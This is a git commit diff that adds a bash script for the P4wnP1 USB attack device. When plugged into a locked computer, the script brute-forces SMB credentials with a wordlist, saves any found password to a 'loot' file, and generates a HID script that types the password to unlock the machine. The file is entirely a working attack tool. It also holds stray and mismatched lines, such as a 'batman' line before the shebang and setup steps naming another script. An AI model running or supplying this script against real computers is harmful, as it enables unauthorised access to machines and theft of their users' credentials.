f84bcb7ac3d1a99669f0188911bd29a9299f3619
bbaranoff <37385191+bbaranoff@users.noreply.github.com>
2021-12-19 17:47:10 +0100

    Add files via upload

---
+++ pwnpi-GoSMBCredsBruteforceUnlock.sh
@@ -0,0 +1,56 @@
+batman
+#!/bin/bash
+
+
+
+# P4wnP1 SMBrute
+# Author: Mohamed A. Baset aka @SymbianSyMoh
+
+# Setup
+# 1. Clone this repo https://github.com/SymbianSyMoh/mmcbrute in /usr/local/P4wnP1/programs/
+# 2. The impacket library is required in order to run this script, do "pip2 install impacket" If that fails, you can get the library from here: https://github.com/CoreSecurity/impacket
+# 3. Set the proper variables paths
+password_process_file="/usr/local/P4wnP1/scripts/ppf.txt"
+password_loot_file="/usr/local/P4wnP1/loot/credentials.txt"
+unlock_hid_script="/usr/local/P4wnP1/HIDScripts/unlock_hid_script.js"
+user_bruteforce_list="/root/user.txt"
+pass_bruteforce_list="/usr/share/john/password.lst"
+# 4. Put this script under /usr/local/P4wnP1/scripts/P4wnP1-PySMBCredsBruteforceUnlock.sh
+# 5. Create a trigger action with those properties:
+	# Enabled: on
+	# One Shot: on
+	# Trigger: DHCP lease issued
+	# Action: run a bash script
+	# Script path: P4wnP1-PySMBCredsBruteforceUnlock.sh
+# 6. Save the configuration and set it in a master template and set it as "Startup Master Template"
+# 7. Plug the P4wnP1 in a locked computer, once the DHCP lease offered it will perform SMB bruteforce attack and once succeded it will fire HID script to enter the password and unlock the machine.
+
+#Preparation
+mkdir /usr/local/P4wnP1/loot 2> /dev/null
+rm $unlock_hid_script 2> /dev/null
+rm $password_process_file 2> /dev/null
+
+cd /root/go/bin
+./godance -h 172.16.0.2 -u user.txt -w /usr/share/john/password.lst -d WORKGROUP -t 500 | tee test | { grep -q "Username" <(tail -F /root/go/bin/test | tee /dev/stderr) && killall -9 godance; }
+cat test > $password_process_file
+if grep -q "voice" $password_process_file; then
+echo "[*] Password found!"
+user=$(cat $password_process_file | grep "Username: " | cut -d "/" -f 3 | cut -d " " -f 3)
+pass=$(cat $password_process_file | grep "Username: " | cut -d "/" -f 5 | cut -d " " -f 3)
+echo "[*] Storing found credentials..."
+echo "User:$user - Pass:$pass" >> $password_loot_file
+echo "[*] Preparing unlocking script..."
+echo "layout('fr')" > $unlock_hid_script
+echo "press(\"ESC\")" >> $unlock_hid_script
+echo "delay(2000)" >> $unlock_hid_script
+echo "type(\"$pass\n\")" >> $unlock_hid_script
+echo "[*] Unlocking target machine..."
+P4wnP1_cli hid run unlock_hid_script.js
+echo "[*] Unlocked successfully!"
+else
+echo ""
+echo "[*] Password cannot be found in the wordlist!"
+P4wnP1_cli led -b 0
+fi
+
+# Performance: Slow, processed 1835 password guessing in 4 minutes and 25 seconds!
